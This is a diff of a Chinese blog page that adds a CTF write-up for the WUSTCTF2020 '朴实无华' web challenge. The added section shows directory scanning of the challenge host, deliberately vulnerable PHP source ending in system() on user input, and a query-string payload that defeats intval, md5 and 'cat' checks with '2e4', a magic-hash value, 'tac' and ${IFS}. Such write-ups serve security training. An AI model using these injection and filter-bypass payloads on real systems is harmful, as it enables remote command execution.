@@ -63,8 +63,13 @@
 <meta property="og:image" content="http://example.com/img/tw19.png">
 <meta property="og:image" content="http://example.com/img/tw20.png">
 <meta property="og:image" content="http://example.com/img/tw21.png">
+<meta property="og:image" content="http://example.com/img/pswh1.png">
+<meta property="og:image" content="http://example.com/img/pswh2.png">
+<meta property="og:image" content="http://example.com/img/pswh3.png">
+<meta property="og:image" content="http://example.com/img/pswh4.png">
+<meta property="og:image" content="http://example.com/img/pswh5.png">
 <meta property="article:published_time" content="2023-09-17T12:08:50.000Z">
-<meta property="article:modified_time" content="2023-10-05T07:33:34.677Z">
+<meta property="article:modified_time" content="2023-10-07T14:10:15.654Z">
 <meta property="article:author" content="notbad3">
 <meta property="article:tag" content="the quieter you become,the more you can hear">
 <meta name="twitter:card" content="summary_large_image">
@@ -237,7 +242,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          15k 字
+          17k 字
         
       </span>
     
@@ -248,7 +253,7 @@
         
         
         
-          126 分钟
+          143 分钟
         
       </span>
     
@@ -496,16 +501,25 @@
 <p>以上内容参考了这些师傅们的文章，感谢！：</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sculptor-liu.github.io<span class="hljs-regexp">/2021/</span><span class="hljs-number">03</span><span class="hljs-regexp">/20/</span>GXYCTF-<span class="hljs-number">2019</span>-%E7%A6%<span class="hljs-number">81</span>%E6%AD%A2%E5%A5%<span class="hljs-number">97</span>%E5%A8%<span class="hljs-number">83</span>/<br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/LLeaves/</span>p/<span class="hljs-number">12868440</span>.html<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_62879498/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">124538469</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/Manuffer/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">120738755</span>?spm=<span class="hljs-number">1001.2014</span>.<span class="hljs-number">3001.5506</span><br></code></pre></td></tr></table></figure>
 
+<h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>进环境发现是这么个东西。。</p>
+<p><img src="/img/pswh1.png" srcset="/img/loading.gif" lazyload alt="pswh1"></p>
+<p>确实和题目对应了，哈哈。他这个报错好像是个</p>
+<p>不知道干啥就用dirsearch扫：<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/ --delay 3 -t 30</code></p>
+<p>Kali下不用加后面那一串：<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/</code></p>
+<p>扫出来两个东西：<code>index.php</code>和<code>robots.txt</code>，访问<code>robots.txt</code>：</p>
+<p><img src="/img/pswh2.png" srcset="/img/loading.gif" lazyload alt="pswh2"></p>
+<p><code>index.php</code>就是进去这个界面，访问下这个<code>fAke_f1agggg.php</code>:</p>
+<p><img src="/img/pswh3.png" srcset="/img/loading.gif" lazyload alt="pswh3"></p>
+<p>:(，burpsuite抓包看看什么情况：</p>
+<p><img src="/img/pswh4.png" srcset="/img/loading.gif" lazyload alt="pswh4"></p>
+<p>芜湖，响应包里有这么个东西：<code>fl4g.php</code>，直接访问：</p>
+<p><img src="/img/pswh5.png" srcset="/img/loading.gif" lazyload alt="pswh5"></p>
+<p>这里发现个问题：页面返回一堆乱码，但是放burpsuite的repeater模块里看又不存在，和上面那段<code>php</code>报错有关系？不太懂。。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<span class="hljs-comment">//num经过intval后要小于2020，加1再inntval要大于2021，直接用科学计数法绕过：2e4，即/?num=2e4</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;金钱解决不了穷人的本质问题&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<span class="hljs-comment">//md5弱等于其md5加密后，直接数组绕过：/?md5[]=1</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123; <span class="hljs-comment">//get_flag中不能有空格</span><br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);  <span class="hljs-comment">//str_ireplace函数不区分大小写。</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快到非洲了&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br><br></code></pre></td></tr></table></figure>
 
-
-
-
-
-
-
-
-
-
+<p>过滤了<code>cat</code>，绕过姿势太多了。。<code>ca&#39;&#39;t</code>还有<code>tac</code>啥的都可以。先<code>ls</code>看看当前目录都有啥东西：</p>
+<p>payload:<code>?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p>
+<p><code>flag&#123;7ff4de78-289c-405b-9361-313240dfdcec&#125;</code></p>
 
                 
               </div>
@@ -572,8 +586,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" title="RCE中一些常见的绕过方法">
-                        <span class="hidden-mobile">RCE中一些常见的绕过方法</span>
+                      <a href="/2023/09/17/ko1/" title="2023_0xGame_Write_up_Week1">
+                        <span class="hidden-mobile">2023_0xGame_Write_up_Week1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
